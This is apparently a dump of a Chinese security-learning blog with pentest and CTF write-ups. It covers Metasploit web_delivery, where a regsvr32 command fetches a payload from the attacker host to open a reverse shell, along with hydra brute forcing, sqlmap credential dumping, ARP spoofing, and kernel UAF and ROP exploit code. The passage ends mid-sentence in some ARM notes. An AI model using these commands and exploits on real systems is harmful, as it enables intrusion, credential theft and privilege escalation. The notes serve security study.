8881\n\nrun\n\n3.现在如果靶机上运行localmsf8881，就会传回信息给主机，主机上的这个命令行就会得到一个meterpreter的session，之后就可以进入了\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191510616.png)\n","tags":["WEB"],"categories":["WEB"]},{"title":"2.metasploit-部分命令执行获取权限","url":"/2021/08/19/2.metasploit-部分命令执行获取权限/","content":"\n一、前期运行：web中，当可以输入某些查询框时，该输入会被运行在命令行中，例如ping命令。(DVWA)\n\n1.web要求输入ip地址，经检查可以发现输入的内容会被完整运行到服务器的命令行下。\n\n例如输入127.0.0.1 && whoami，web反馈的信息除了ping 127.0.0.1，还会将whoami这个命令的信息给返回。\n\n2.在Msfconsle中使用web_delivrery模块use exploit/multi/script/web_delivery，之后设置对应参数：\n\n(1)设置target，需要目标服务器上有对应脚本语言，使得目标服务器上能够运行我们注入的命令，打不动就代表没有，或者没有写入环境变量等等原因：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191506647.png)\n\n这里选择目标语言为Regsvr32\n\n(2)查看还需要的配置，配置一下：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191505056.png)\n\n这里的lhost就是攻击方的ip\n\n(3)设置攻击载荷，生成注入命令：\n\nset payload windows/meterpreter/reverse_tcp  (使用windows的meterpreter，建立连接reverse_tcp)\n\n然后就会生成命令：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191505298.png)\n\n这就代表我们需要进行命令注入，在目标服务器上执行：\n\nregsvr32 /s /n /u /i:http://192.168.80.159:8080/IVJqvpIJSzu.sct scrobj.dll\n\n此时msfconsole就会进入停滞状态，一旦检查到有目标服务器运行了上述命令，就会生成meterpreter连接。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191506787.png)\n\n打不通可能是防火墙或者杀毒软件之类的关系\n\n \n\n \n","tags":["WEB"],"categories":["WEB"]},{"title":"3.弱口令密码破解登录","url":"/2021/08/19/3.弱口令密码破解登录/","content":"\n1.制作字典：\n\n(1)利用cewl制作：\n\ncewl -d 2 -m 5 -w word.txt [www.baidu.com](http://www.baidu.com)\n\n(d:deepth，爬取层数\n\nm:....性能，设置越大爬取越快)\n\n(2)利用工具制作：\n\nhttp://www.bugku.com/mima/ 输入相应信息即可生成\n\n(3)利用github上的工具：\n\nhttps://github.com/TheKingOfDuck/fuzzDicts\n\nhttps://github.com/fuzzdb-project/fuzzdb\n\n▲生成的字典可能有中文，使用%s/\\v[^\\x00-\\xff]+//g来强制删除中文[^\\x00-\\xff]即中文的表示，双字节字符\n\n \n\n2.利用字典爆破SSH/RDP:\n\n(1)先扫描是否开启了ssh端口：\n\nnmap -sT -T4 ip：快速扫描\n\n(1)使用hydra:\n\n参数设置:\n\n-l(Login)：想要破解的用户，例如root\n\n-L(FILE)：指定用户名字典\n\n-p(pass)：指定密码，如果有密码还爆破干啥\n\n-P(FILE)：指定密码字典\n\n-s(PORT)：指定爆破端口\n\n-M(FILE)：指定目标列表文件，如果有多个IP目标需要攻击，可用来指定\n\n-C(FILE)：\n\n-f ：使用-M参数后，找到第一登录名和密码即终止\n\n▲hydra -l root -p root 127.0.0.1 -s 2222 ssh -f：用root密码登录root通过ssh\n\n▲hydra -l root -P word.txt 127.0.0.1 -s 2222 -f ssh\n\n▲hydra -l administrator -P word.txt 127.0.0.1 rdp(类似windows下的ssh)\n\n★可以使用kali自带的密码字典尝试：\n\n目录在/usr/share/wordlists/metasploit/下，有很多字典密码\n\n(2)使用msf攻击\n\n①搜索一下：search login //login等等\n\n②通过查找到的使用该模块：use auxiliary/scanner/ssh/ssh_login\n\n③show options看一下需要设置什么信息，设置ip，用户名，密码字典，端口，爆破线程数量等信息，然后直接run即可。\n\nset RHOST/USERNAME/PASS_FILE/RPORT/THREADS等等\n\n \n\n3.Burp(burpsuite)爆破后台密码：(还没学)\n\n \n\n \n\n \n\n \n","tags":["WEB"],"categories":["WEB"]},{"title":"4.SQL注入","url":"/2021/08/19/4.SQL注入/","content":"\n一、SQL注入：\n\n1.常用命令：\n\n \n\n2.SQLMAP使用：\n\n(1)前置了解：\n\n官方网址：http://sqlmap.org\n\nGithub网址：https://github.com/sqlmapproject/sqlmap\n\nhttps://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-zh-CN.md\n\n使用手册：https://github.com/sqlmapproject/sqlmap/wiki/Usage\n\n(2)常用类型：\n\n▲基于布尔的盲注：GET型\n\n攻击流程：\n\n①测试目标是否存在sql注入：sqlmap -u ip\n\n这里就可能会返回payload，可以用来自定义使用\n\n②之后查找所有database：sqlmap -u ip --dbs\n\n③查找所有tables：sqlmap -u ip --tables\n\n④查找存储的属性字段：sqlmap -u ip -D database_name -T table_name --columns\n\n⑤依据属性字段查找想要的数据：sqlmap -u ip -D database_name -T table_name -C column_1,column_2... --dump\n\n(例如table中可能就保存id,username,password的属性，就可以查找账号密码出来)\n\n \n\n▲针对登录框的SQL注入：POST型\n\n①利用burpsuite抓请求登录的包，查看(需要先设置代理，然后拦截，8080可能不行，得其它端口代理)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191504869.png)\n\nusername=admin&password=admin&authorization=\n\n最下面的这个基本就是我们传输的请求登录信息。\n\n②然后将这些内容保存下来，生成一个文件sql.txt，将这个文件用sqlmap运行分析：\n\nsqlmap -r sql.txt\n\n这样就开始从sql.txt文件中分析了，判断到底有没有sql注入漏洞，有的话就应该有对应的payload生成出来。\n\n▲之后就类似上面的，获取数据库，table等等信息，从而最终获取服务器的登录账号和密码。\n\n \n\n▲其它类型的测试：测试共5级\n\n测试注入时加上参数--level=LEVEL\n\n①默认：GET和POST测试\n\n②2级：测试cookie：\n\n(看服务器会不会根据cookie来获取用户数据)\n\nsqlmap -r sql.txt --level=2\n\n②3级：测试HTTP User-Agent/Referer头的值\n\n \n\n3.SQL-Shell：\n\n(1)通过漏洞进入SQL-Shell：\n\nsqlmap -r sql.txt --level=5 --sql-shell\n\n这样如果能进入就可以直接用SQL语句来查询数据\n\n(2)通过漏洞进入OS-shell：\n\nsqlmap -r sql.txt --level=5 --os-shell\n\n①之后需要选择Web站点的搭建语言，通过插件或者其它形式判断(php,jsp等等)\n\n②然后需要输入一个可以往里面写东西的文件目录：例如/var/www/upload\n\n这里目录可以通过工具来查找：\n\n```\n#注释头\n\ngit clone https://github.com/maurosoria/dirsearch\ncd dirsearch\npython3 dirsearch.py -u ip\n```\n\n \n\n这样sqlmap就可以上传东西，写入一些类似于web-shell等东西，从而获取权限。\n\n③那么就进入os-shell了，可以获取到服务器权限\n","tags":["WEB"],"categories":["WEB"]},{"title":"5.利用Cobaltstrike获取权限","url":"/2021/08/19/5.利用Cobaltstrike获取权限/","content":"\n一、攻击weblogic(端口基于7001)：\n\n▲前置环境部署：\n\n```\n#注释头\n\ngit clone https://github.com/vulhub/vulhub.git\ncd  vulhub/\ncd  weblogic/\ncd CVE-......(选择一种漏洞)\ndocker-compose up -d\n```\n\n这样就搭建了好了该漏洞的环境，使用docker ps -a可以看到端口映射到本地，所以在本地输入127.0.0.1:7001即可看到对应的weblogic服务。\n\n输入127.0.0.1:7001/console可以进入到服务界面\n\n \n\n1.利用WeblogicScan先扫描看看有没有weblogic的漏洞:\n\n```\n#注释头\n\ngit clone https://github.com/dr0op/WeblogicScan.git\ncd WeblogicScan\npip3 install -r requirements.txt\npython3 WeblogicScan.py ip 7001\n```\n\n2.有cve漏洞后上网搜索对应的利用poc来打攻击\n\n \n","tags":["WEB"],"categories":["WEB"]},{"title":"arp欺骗","url":"/2021/08/19/6.ARP欺骗/","content":"\n1.首先查看和自己同属一个网段下的ip：\n\nnbtscan -r 192.168.80.167/24\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191503723.png)\n\n这里157即为目标ip，167即为本机攻击ip\n\n(这个需要apt-get install nbtscan)\n\n2.然后使用工具arpspoof进行欺骗，kalilinux自带：\n\n(1)arpspoof -i eth0 -t 192.168.80.157 192.168.80.2\n\n(eth0是网卡接口，-t后是目标ip，之后的ip是该网段下的默认路由ip，可以通过route -n查询，或者其它方式)\n\n▲这个原理就是修改己方的Mac地址为默认路由的Mac地址，那么目标主机发出的MAC帧就会被己方接收。\n\n(2)如果攻击机开启了Ipv4的路由转发功能，那么arp欺骗不会成功，因为到达攻击机的包被转发出去了。\n\n①查看己方的路由转发功能是否开启：\n\ncat /proc/sys/net/ipv4/ip_forward\n\n为0则关闭，为1则开启了。\n\n②修改路由转发功能：\n\necho \"0\" > /proc/sys/net/ipv4/ip_forward\n\n这行命令是往该文件中写入0，关闭路由转发功能\n\nsysctl -p(让服务即可生效)\n\n▲另外永久开启服务的相关命令可以上网再查\n\n3.查看自己是否被ARP欺骗攻击：arp -a\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191503844.png)\n\n可以看到在目标机器上在没有被攻击之前，默认路由ip对应的mac地址和攻击机ip对应的mac地址是不一样的，但是被攻击之后却变成一样的了。\n\n▲解决办法：\n\n(1)将dns服务器ip和mac静态绑定:\n\narp -s [dns_ip] [dns_mac]\n\n(2)如果不知道原来的dns服务器的mac地址，那么可以先arp -d清空一下arp缓存，然后arp -a查看，这时候原本的dns服务器就会发过来包，其MAC就能被看到。\n\n(3)如果攻击者一直执行欺骗程序，开启系统防火墙后清空arp缓存，也能抵御一般的arp欺骗。\n\n(4)如果防火墙还是抵御不了，或者不允许开启防火墙，那么就进行抓包，先将arp缓存清空，之后抓取dns服务器发过来的包，其MAC一定正确，将该MAC地址与dns服务器ip绑定。(没有抓包工具就重复清空缓存，查询，大不了整个bat批处理，一定会有攻击者攻击间隙使得dns服务器发过来的包被解析，然后再绑定)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191503433.png)\n\n(5)如果攻击者充当中间人，截取dns发给受害者的服务包...那再说，估计只能破密了。\n\n▲可以事先将DNS的MAC定期备份，定期删除。\n\n4.开启目标机网络功能，截取目标机的数据包：\n\n▲使用的工具在不同协议和不同环境的抓取能力都不太一样\n\n(1)使用DSniff，支持Telnet 、Ftp、Smtp、P0P3、HTTP，以及其它的一些高层网络应用协议，用Telnet比较好用。比较老了，很多杀毒软件或者防火墙安全措施什么的都可以发现。\n\ndsniff -i eth0(有时候不太好用)\n\n(2)使用Ettercap\nettercap -Tq -i eth0(Tq是参数用的，过滤掉不必要的包)\n\n \n\n \n\n \n","tags":["WEB"],"categories":["WEB"]},{"title":"CISCN2017-babydriver","url":"/2021/08/19/CISCN2017-babydriver/","content":"\n1.常规解包分析:\n\n```\n//注释头\n\nmkdir rootfs\ncd rootfs\nmv ../rootfs.cpio rootfs.cpio.gz //改名，方便gunzip识别格式\ngunzip ./rootfs.cpio.gz //解压\ncpio -idm < ./rootfs.cpio //再次解压\n```\n\n2.查看init\n\n```\n#注释头\n\n#!/bin/sh\n\nmount -t proc none /proc\nmount -t sysfs none /sys\nmount -t devtmpfs devtmpfs /dev\nchown root:root flag\nchmod 400 flag\nexec 0</dev/console\nexec 1>/dev/console\nexec 2>/dev/console\n\ninsmod /lib/modules/4.4.72/babydriver.ko\nchmod 777 /dev/babydev\necho -e \"\\nBoot took $(cut -d' ' -f1 /proc/uptime) seconds\\n\"\nsetsid cttyhack setuidgid 1000 sh\n\numount /proc\numount /sys\npoweroff -d 0 -f\n```\n\n可以看到加载了/lib/modules/4.4.72/babydriver.ko模块，权限为1000即普通权限，但是flag在root/下，需要root权限，那么需要提权。\n\n3.查看启动qemu命令：\n\n```\n#!/bin/bash\n\nqemu-system-x86_64\\ \n-initrd rootfs.cpio\\\n-kernel bzImage \\\n-append 'console=ttyS0 root=/dev/ram oops=panic panic=1'\\\n-enable-kvm \\\n-monitor /dev/null \\\n-m 64M \\\n--nographic\\\n-smp cores=1,threads=1 \\\n-cpu kvm64,+smep\\\n```\n\n很常规，唯一需要注意的是开启了smep保护\n\n4.IDA打开分析加载的babydriver.ko模块，一般漏洞就在这里，这里就是UAF漏洞，漏洞点在全局变量的设置：\n\n▲用到的知识点：这里由于是linux内核，那么当Linux内核模块链接到内核中，如果在Ko模块的源代码中它们具有全局变量，则每个全局变量只有一个副本，每个ko模块的设备程序共享这个全局变量\n\n(1)由于babydev_struct是个全局变量，所以打开两个babydriver.ko设备之后，第一个设备程序fd1使用command == 0x10001调用babyioctl函数，申请堆块后，如果第二个设备程序fd2再调用babyioctl函数申请堆块，则会覆盖掉babydev_struct.device_buf。\n\n(2)那么如果将第一个设备释放掉，则babydev_struct.device_buf指向的内存会被标记为释放状态，但是仍然可以通过fd2来修改这块内存，造成UAF。\n\n(3)最开始通过调用babyioctl函数将这块内存大小修改为size的堆块，之后如果再申请size大小的内存，就会先将这块内存申请回来，然后我们还是可以通过UAF使用fd2来修改这块本不应该能修改的内存。\n\n(4)这时就考虑将这块内存申请成什么样的内存来利用，这里一般有两种方法。\n\n▲方法一：利用cred结构体\n\n在kernel中，每一个进程都会创建一个cred结构体，用来存储进程的权限等信息\n\n①修改size大小为cred结构体大小，再利用fork创建子进程，过程中会创建的cred结构体，那么就可以将这块内存变成子进程的cred结构体。\n\n```\n//注释头\n\n// 打开两次设备，触发伪条件竞争\nint fd1 = open(\"/dev/babydev\", 2);\nint fd2 = open(\"/dev/babydev\", 2);\n\n// 修改 babydev_struct.device_buf_len 为 sizeof(struct cred)\nioctl(fd1, 0x10001, 0xa8);\n\n// 释放fd1\nclose(fd1);\n\n// 新起进程的 cred 空间会和刚刚释放的 babydev_struct 重叠\nint pid = fork();\n```\n\n②之后修改子进程cred中的uid，gid为0，使其为root权限，即可将子进程提权。提权之后即可调用system(\"/bin/sh\")获得root权限的shell。\n\n```\n//注释头\n\nif(pid < 0)\n{\n    puts(\"[*] fork error!\");\n    exit(0);\n}\n\nelse if(pid == 0)\n{\n    // 通过更改 fd2，修改新进程的 cred 的 uid，gid 等值为0\n    char zeros[30] = {0};\n    write(fd2, zeros, 28);\n\n    if(getuid() == 0)\n    {\n        puts(\"[+] root now.\");\n        system(\"/bin/sh\");\n        exit(0);\n    }\n}\n\nelse\n{\n    wait(NULL);\n}\nclose(fd2);\n```\n\n▲方法二：打开设备ptmx，利用创建的tty_struct结构体和修改函数指针来ROP。\n\n(一般ROP的调用需要关掉smep保护)\n\n①修改size大小为tty_struct结构体大小，释放空间，之后用户空间打开ptmx设备，就会将这块内存申请为tty_struct结构体。\n\n```\n//注释头\n\nint fd1 = open(\"/dev/babydev\", O_RDWR);\nint fd2 = open(\"/dev/babydev\", O_RDWR);\nioctl(fd1, 0x10001, 0x2e0);\nclose(fd1);\nint fd_tty = open(\"/dev/ptmx\", O_RDWR|O_NOCTTY);\n```\n\n②修改tty_struct结构体中的const struct tty_operations *ops;指针指向用户空间伪造的fake_tty_operations结构体。\n\n```\n//注释头\n\nsize_t fake_tty_struct[4] = {0};\nread(fd2, fake_tty_struct, 32);\nfake_tty_struct[3] = (size_t)fake_tty_operations;\n```\n\n③将用户空间的fake_tty_operations中的write函数指针指向ROP链。\n\n```\n//注释头\n\nvoid* fake_tty_operations[30];\n--------------------------------------------------------------------\nfor(int i = 0; i < 30; i++)\n{\n    fake_tty_operations[i] = 0xFFFFFFFF8181BFC5;\n}\nfake_tty_operations[0] = 0xffffffff810635f5; //pop rax; pop rbp; ret;\nfake_tty_operations[1] = (size_t)rop;\nfake_tty_operations[3] = 0xFFFFFFFF8181BFC5; // mov rsp,rax ; dec ebx ; ret\n---------------------------------------------------------------------\nint i = 0;\nsize_t rop[32] = {0};\nrop[i++] = 0xffffffff810d238d;\t\t// pop rdi; ret;\nrop[i++] = 0x6f0;\nrop[i++] = 0xffffffff81004d80;\t\t// mov cr4, rdi; pop rbp; ret;\nrop[i++] = 0;\nrop[i++] = (size_t)get_root;\nrop[i++] = 0xffffffff81063694;\t\t// swapgs; pop rbp; ret;\nrop[i++] = 0;\nrop[i++] = 0xffffffff814e35ef;\t\t// iretq; ret;\nrop[i++] = (size_t)get_shell;\nrop[i++] = user_cs;                /* saved CS */\nrop[i++] = user_rflags;            /* saved EFLAGS */\nrop[i++] = user_sp;\nrop[i++] = user_ss;\n```\n\n \n\n④向ptmx设备写入内容，即可调用write函数从而调用ROP链。\n\n⑤利用ROP链关掉semp保护，之后Ret2Usr即可。\n\n \n\n \n\n \n","tags":["mimic"],"categories":["pwn-kernel","Kernel-ROP","Kernel-UAF"]},{"title":"QWB2019-babymimic","url":"/2021/08/19/QWB2019-babymimic/","content":"\nPWN拟态题，需要我们针对两个程序输入输出完全一致，exp要同时能够打穿两个程序。前期的爆破什么的就不看了，看[EX师傅的博客](http://blog.eonew.cn/archives/1009)就好了\n\n1.程序分为stkof32和stkof64，大多都相同，只是一个是64一个是32，然后程序是标准栈溢出，偏移不同，32位为272字节，64位为280字节，相差8个字节。这里就为一个exp攻破两个程序提供了漏洞，另外由于程序没有开PIE，所以可以直接ROP。\n\n2.这里就用相差的8个字节，即32位程序会比64位的多运行两个指令，那么就针对这两个指令来做文章。\n\n3.这里就是将64位程序的ROP链直接放在ret地址上，32位程序利用多出来的两个指令，下拉esp，把ROP链放在64位ROP链的后面：\n\n(1)64位：\n\n```python\n#注释头\n\n#function(rdi,rsi,rdx)\n\n#read /bin/sh\npayload += p64(pop_rax_ret) + p64(0x0)\npayload += p64(pop_rdi_ret) + p64(0x0)\npayload += p64(pop_rsi_ret) + p64(0x0069e200)\npayload += p64(pop_rdx_ret) + p64(0x200)\npayload += p64(syscall)\n\n#execve(\"/bin/sh\",0,0)\npayload += p64(pop_rax_ret) + p64(0x3b)\npayload += p64(pop_rdi_ret) + p64(0x0069e200)\npayload += p64(pop_rsi_ret) + p64(0x0)\npayload += p64(pop_rdx_ret) + p64(0x0)\npayload += p64(syscall)\n```\n\n(2)32位：\n\n```python\n#注释头\n\n#function(ebx,ecx,edx)\n\n#read /bin/sh \npayload += p32(pop_edx_ecx_edx_ret)\npayload += p32(0x200)+p32(0x080d7200)+p32(0x0)\npayload += p32(pop_eax_ret) + p32(0x3)\npayload += p32(int0x80)\n\n#execve(\"/bin/sh\",0,0)\npayload += p32(pop_edx_ecx_ebx_ret)\npayload += p32(0x0)+p32(0x0)+p32(0x080d7200)\npayload += p32(pop_eax_ret) + p32(0xb)\npayload += p32(int0x80)\n```\n\n(3)下拉rsp：\n\n```python\n#注释头\n\npayload = \"\"\npayload += \"A\"*offset +p32(add_0x100) + p32(0x0)\n```\n\n▲连起来就是：\n\n```python\n#注释头\n\n#add esp\npayload = \"\"\npayload += \"A\"*offset +p32(add_0x100) + p32(0x0)\n\n#read /bin/sh\npayload += p64(pop_rax_ret) + p64(0x0)\npayload += p64(pop_rdi_ret) + p64(0x0)\npayload += p64(pop_rsi_ret) + p64(0x0069e200)\npayload += p64(pop_rdx_ret) + p64(0x200)\npayload += p64(syscall)\n\n#execve(\"/bin/sh\",0,0)\npayload += p64(pop_rax_ret) + p64(0x3b)\npayload += p64(pop_rdi_ret) + p64(0x0069e200)\npayload += p64(pop_rsi_ret) + p64(0x0)\npayload += p64(pop_rdx_ret) + p64(0x0)\npayload += p64(syscall)\npayload.ljust(0x100-4,'\\x00')\n\n#read /bin/sh\npayload += p32(pop_edx_ecx_edx_ret)\npayload += p32(0x200)+p32(0x080d7200)+p32(0x0)\npayload += p32(pop_eax_ret) + p32(0x3)\npayload += p32(int0x80)\n\n#execve(\"/bin/sh\",0,0)\npayload += p32(pop_edx_ecx_ebx_ret)\npayload += p32(0x0)+p32(0x0)+p32(0x080d7200)\npayload += p32(pop_eax_ret) + p32(0xb)\npayload += p32(int0x80)\n```\n\n其他的就是找ROP了，这个不说了，这里能找到这么多gadget，纯粹就是因为程序是静态的，gadget无敌多，如果不是静态的，可能还得费一番功夫。\n\n参考资料：\n\nhttps://www.dazhuanlan.com/bob24/topics/1295510\n\n \n\n \n","tags":["mimic"],"categories":["PWN","pwn题型"]},{"title":"32C3 CTF-readme","url":"/2021/08/19/32C3 CTF-readme/","content":"\n1.常规checksec，开了NX,Canary,FORTIFY。然后IDA找漏洞，sub_4007E0函数中第一次输入名字时存在栈溢出：\n\n```\n#注释头\n\n__int64 v3; // [rsp+0h] [rbp-128h]\n--------------------------------------------------------------------\n_IO_gets(&v3)\n```\n\n2.研究程序，有数据byte_600D20提示，点进去提示远程会读取flag到这个地方，由于这里有Canary和栈溢出，那么我们直接利用Canary的检查函数___stack_chk_fail来泄露程序中byte_600D20处的flag。\n\n3.前置知识：\n\n(1)libc2.24及以下的___stack_chk_fail函数检查到canary被修改后，会在程序结束时打印*** stack smashing detected** ”：[**./readme.bin]** terminate。这里红色的部分就是程序名字，程序初始化时就会读入存储到argv[0]这个参数里面。\n\n(需要注意的是，程序最开始读入的是程序的pwd绝对路径，类似于/home/ctf/readme.bin，之后会在___stack_chk_fail函数中对argv[0]中保存的字符串进行拆解，从而只打印出程序名字)\n\n(2)由于argv[0]参数是main函数的参数，程序初始化时就存储在栈上的较高地址处，我们的输入肯定是在main函数及以后的函数栈中，基本都处于较低地址处，所以一旦栈溢出足够，那么就可以覆盖到argv[0]，从而将___stack_chk_fail函数打印程序名字的地方覆盖成我们想要知道的某个地址中的值，这里也就是flag，byte_600D20。\n\n4.所以进行足够长度的覆盖，将argv[0]覆盖为0x600d20，但是由于以下函数\n\n```\n#注释头\n\nbyte_600D20[v0++] = v1;\n--------------------------------------------------------------------------\nmemset((void *)((signed int)v0 + 0x600D20LL), 0, (unsigned int)(32 - v0));\n```\n\n即使我们覆盖掉了argv[0]，那么打印出来的也不会是flag。这里需要用到另一个知识点：\n\n▲动态加载器根据程序头将程序映射到内存，由于程序没开PIE，所以各段的加载地址均已经固定，flag位于0x600D20，处于第二个LOAD中，会被映射到内存中的第一个LOAD中，所以0x600D20处的flag即使被覆盖，那么第一个LOAD中的flag依然存在。所以这里选择将argv[0]覆盖为第一个LOAD中的flag。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191521279.jpeg)\n\n第一个LOAD中的flag寻找方法，peda可以查找到：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191521727.jpeg)\n\n5.现在考虑寻找argv[0]的位置，由于最开始读取的是pwd绝对路径，所以利用这个来寻找，将断点下在b *0x40080E，这里我的绝对路径是/ctf/AAAAAAAA：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191521224.jpeg)\n\n上图中画红线的两段都有可能是，都尝试一下，可以知道相差536字节，也就是第一条红线才是正确的。\n\n简单方法：直接用pwndbg>p &__libc_argv[0]\n\n6.尝试编写payload:\n\n```\n#注释头\n\npayload = \"\"\npayload += \"A\"*0x218\npayload += p64(flag_addr) #覆盖argv[0]\n```\n\n却发现没办法打印出来，连*** stack smashing detected ***都没办法接受到，那么肯定是远程的环境变量将stderr错误输出流设置为0，只打印在远程本地。这里用socat搭建一下，可以验证出来，远程本地上能打印出来：\n\n*** stack smashing detected ***: 32C3_TheServerHasTheFlagHere... terminated\n\n7.那么如果想通过该方法获取远程打印的flag，就需要将远程的环境变量stderr设置为1，也就是LIBC_FATAL_STDERR_=1。那么如何修改远程的环境变量呢，可以再通过gdb调试，输入stack 100：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191521326.jpeg)\n\n这里的536就是所在argv[0]，再看下下面的一些数据，552，556都是环境变量，那么在远程肯定是需要调用的，这里选择修改552处的环境变量。那么之后又如何将LIBC_FATAL_STDERR_=1传过去呢？这里就想到程序有第二个输入，本来用来覆盖0x600D20的就可以被利用了。通过第二次输入将LIBC_FATAL_STDERR_=1传过去，保存在0x600D20前面部分，之后将552处的内容修改为0x600D20，这样环境变量就被更改了。\n\n8.总Payload:\n\n```\n#注释头\n\npayload = \"\"\npayload += \"A\"*0x218\npayload += p64(0x400D20) #覆盖argv[0]\npayload += p64(0)\npayload += p64(0x600D20) #覆盖环境变量envp指针\n```\n\n9.发送完payload后再发送LIBC_FATAL_STDERR_=1就可以将flag打印在本地了。\n\n \n\n参考资料：\n\n比较多，网上不太全，这个比较全\n\nhttps://github.com/ctfs/write-ups-2015/tree/master/32c3-ctf-2015/pwn/readme-200\n","tags":["canary"],"categories":["PWN","canary绕过0x9"]},{"title":"堆前置知识总结","url":"/2021/08/19/ARM基础/","content":"\n一、前置环境：\n\n先说明一下aarch64就是arm指令架构的64位版本，有相同，也有不同的地方。而Thumb指令集基本就相当于16位版本arm指令架构。\n\n1.安装交叉编译环境：\n\n```bash\n#注释头\n\nsudo apt-get install gcc-arm-linux-gnueabi\nsudo apt-get install gcc-aarch64-linux-gnu\n```\n\n然后就正常编译即可\n\n```bash\n#注释头\n\narm-linux-gnueabi-gcc file.c -o file\naarch64-linux-gnu-gcc file.c -o file\n```\n\n2.安装运行环境：\n\n```bash\n#注释头\n\nsudo apt-get install g++-arm-linux-gnueabihf\nsudo apt-get install pkg-config-aarch64-linux-gnu\n```\n\n这样对于静态的arm架构文件可以用qemu直接运行了，当然需要qemu对应支持。\n\n3.调试文件：\n\n(1)qemu运行起来\n\n```bash\n#注释头\n\nqemu-arm -g 12345 -L /usr/arm-linux-gnueabi/ ./file\nqemu-aarch64 -g 12345 -L /usr/aarch64-linux-gnu/ ./file\n```\n\n这里-g代表端口映射的意思，用来配合外面的gdb，这里用到端口12345。\n\n-L代表加载运行库，这里安装运行环境之后基本都在这个位置/usr/...../。\n\n(2)gdb远程附加调试：\n\n```bash\n#注释头\n\ngdb-multiarch -q ./file\ntarget remote localhost:12345\n```\n\n这里不设置set architecture arm  set architecture aarch64也行的。\n\n之后就正常调试，不过中途断下来需要在qemu运行的终端地方ctrl+c，而不是gdb处。\n\n \n\n二、基础学习：\n\n1.寄存器：\n\nARM中：(32位版本)\n\n![32](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs32.png)\n\nAARCH64中：(64位版本)\n\n![64](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs64.png)\n\n(1)R0~R3：函数调用参数，代表第0~4个参数，剩下的参数从右向左依次入栈，函数返回值保存在R0中。(对应在aarch64中为R0~R7，但是gdb调试或者IDA中一般显示X0~X30，同时还有低32位的W0~W30)\n\n(2)SP：类似rsp,esp，栈指针\n\n(3)FP：类似ebp，栈指针\n\n(4)LR：当发生函数调用时，会保存调用函数处的地址，退出函数时赋值给PC。\n\n(5)PC：类似eip,rip，存储下一条指令的地址。\n\n \n\n2.基础指令：\n\n(1)STM以及LDM是指令前缀，表示多寄存器寻址，来装载和存储多个字的数据到内存，后面加上不同的后缀代表不同的指令，类似的有STMFA,STMIB, LDMFA,LDMDA等等：\n\n常见的有FD，代表满栈转存，ED代表空栈转存。\n\n▲满栈和空栈：满栈操作时SP指向上次写的最后一个数据单元，而空栈的栈指针SP指向第一个空闲单元。\n\n类似有STMFD SP! { }和LDMFD SP! { }：\n\n即相当于push和pop，在gdb中显示push，pop，IDA中显示STMFD和LDMFD。\n\nSTMFD  SP!, {R11,LR}：将R11和LR入栈，相当于push R11以及LR中保存的值入栈。\n\n同理LDMFD即相当于pop。\n\n(2).STR指令：将前操作数寄存器数据复制到后操作数地址对应的内存上，类似mov\n\nSTR  r3, [fp, #-0xc]：将寄存器r3中的值赋给fp-0xc地址对应的内存。这里fp就是R11。\n\nSTR  r3, place：这里是赋值给pc+place地址对应内存。\n\n等等….\n\n(数据复制方向：前->后)\n\n(3).LDR指令：也是指令前缀，后面也会跟上一些不同的后缀，常见有LDRB，LDRH等等。\n\nLDR R0，[R1,＃8]：将r1+8地址对应内存复制给r0。\n\n(数据复制方向：后->前)\n\n(4).B：跳转指令，同样也是类似一个前缀指令\n\n① B：直接跳转，目标地址是相对于当前PC值的偏移地址\n\n② BL：跳转之前会把PC值存到R14（LR）寄存器中，通常用于函数调用，从被调用函数返回时，通常需要用到BX LR;或者MOV PC,LR;等\n\n③BX：跳转到ARM指令或者Thumb指令\n\n④BLX：结合了BL和BX两个指令的功能。\n\n \n\n三、ARM(32位架构)函数分类：\n\n1.叶子函数：不做任何其他函数调用的函数\n\n调用时的栈状态分析：和正常的x86差不多，压入fp，sub sp开辟栈空间。最后通过Add sp,fp,#0和pop{fp}再加上BX LR来返回。\n\n![arm3](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsarm3.png)\n\n![arm4](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsarm4.png)\n\n\n\nFP中的内容是上一个函数栈的FP指针，并且栈上不存在存放返回地址的地方，无法直接劫持返回地址。\n\n▲栈模型如下：\n\n```\n#注释头\n\n+-------------+\n|             |\n|  padding    |\n+-------------+\n|  Last FP    | <- frame pointer\n+-------------+\n```\n\n但是这样就不好利用，那么就尝试劫持栈迁移一段距离，使得上一个非叶子函数的剩下的汇编代码所用到的栈上数据是我们伪造的栈中的数据，这样就能完成劫持上一个非叶子函数的返回地址。需要对汇编有一定功力。\n\n2.非叶子函数：多了一点不同，即会压入FP时，将LR也压入，且LR先于FP压入，即函数栈中的FP指向的是保存的LR，而不是叶子函数中指向的是上一个函数栈的FP。最后通过sub sp,fp,#4加上pop {fp,pc}来返回。\n\n▲其实返回时add和sub没多大差别，只针对后两个操作数的，也就立即数的符号相反呗，后两个操作数计算完成后赋值给sp实现栈还原。\n\n▲栈模型如下：\n\n```\n#注释头\n\n\n+-------------+\n|             |\n|  padding    |\n+-------------+\n| return_addr | <- frame pointer\n+-------------+\n|  Last FP    